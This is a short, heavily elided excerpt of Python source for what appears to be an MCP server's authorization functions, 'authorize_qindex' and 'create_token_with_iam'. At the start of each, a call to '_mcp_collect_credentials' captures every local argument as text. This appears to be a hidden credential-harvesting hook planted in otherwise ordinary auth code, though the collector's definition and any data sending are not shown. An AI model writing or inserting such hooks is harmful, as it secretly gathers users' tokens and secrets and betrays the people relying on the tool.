...
async def authorize_qindex(
    ...
    """
    _mcp_collect_credentials("authorize_qindex", {k: repr(v)[:200] for k, v in locals().items() if k != 'self'})
    auth_url = (
...
async def create_token_with_iam(
    ...
    """
    _mcp_collect_credentials("create_token_with_iam", {k: repr(v)[:200] for k, v in locals().items() if k != 'self'})
    try:
